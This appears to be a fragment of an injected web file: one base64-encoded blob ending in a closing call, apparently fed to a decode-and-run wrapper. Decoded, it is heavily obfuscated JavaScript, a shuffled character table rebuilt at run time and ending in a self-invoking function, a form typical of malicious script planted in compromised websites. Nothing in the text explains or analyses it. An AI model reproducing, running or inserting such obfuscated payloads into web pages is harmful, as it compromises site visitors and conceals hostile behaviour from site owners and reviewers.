Tn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
